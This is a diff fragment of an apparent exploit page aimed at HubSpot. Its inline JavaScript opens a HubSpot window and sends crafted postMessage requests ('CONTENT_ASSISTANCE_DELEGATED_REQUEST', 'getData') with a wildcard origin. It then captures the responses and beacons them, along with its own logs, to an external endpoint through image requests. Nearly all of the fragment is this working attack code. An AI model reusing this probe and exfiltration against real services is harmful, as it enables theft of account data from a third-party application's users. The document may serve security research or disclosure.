@@ -36,7 +36,7 @@ function l(m){document.getElementById('log').innerHTML+='<br>'+m;new Image().src
 l('loaded_origin='+window.origin);
 let h=window.open('https://app-eu1.hubspot.com','hub','width=800,height=600');
 if(!h){l('blocked')}else{l('opened');let a=0,c=setInterval(()=>{a++;try{h.origin;if(a%10==0)l('wait_'+a)}catch(e){clearInterval(c);l('ready_'+a);window.addEventListener('message',r=>{l('resp='+r.origin);new Image().src=E+'/?r='+encodeURIComponent(JSON.stringify(r.data).substring(0,200))});setTimeout(()=>{l('send1');h.postMessage({type:'CONTENT_ASSISTANCE_DELEGATED_REQUEST',commandId:'x',featureId:'x',parameters:{},resultCount:1,language:'en',objectId:'46962361',applicationId:'x',basePath:'/',maxPollingAttempts:1,pollingInterval:100},'*')},1000);setTimeout(()=>{l('send2');h.postMessage({type:'raw',_callbackId:'x',body:{action:'getData'}},'*')},2000)}if(a>100){clearInterval(c);l('timeout')}},100)}
-</script>
+
         `;
         
         document.body.appendChild(iframe);
